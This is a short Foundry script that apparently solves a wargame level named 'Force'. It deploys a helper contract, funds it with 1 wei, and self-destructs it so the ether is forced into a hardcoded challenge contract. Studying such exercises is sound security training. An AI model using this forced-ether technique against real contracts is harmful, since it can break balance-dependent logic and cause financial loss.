// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

contract SelfDestructContract {
    address constant CHALLENGE = 0x133fE2b386181EE41749dC3ff428A31C060bC02d;

    function attack() public {
        // solhint-disable-next-line no-selfdestruct
        selfdestruct(payable(CHALLENGE));
    }

    receive() external payable {}
}

contract ForceAttack is Script {
    address constant CHALLENGE = 0x133fE2b386181EE41749dC3ff428A31C060bC02d;

    function run() public {
        vm.startBroadcast(); // Starts broadcasting transactions
        SelfDestructContract sdc = new SelfDestructContract();
        console.log("HackFlip deployed at:", address(sdc));
        (bool sent,) = address(sdc).call{value: 1}("");
        if (!sent) {
            revert();
        }
        sdc.attack();
        console.log(CHALLENGE.balance);
        vm.stopBroadcast();
    }
}
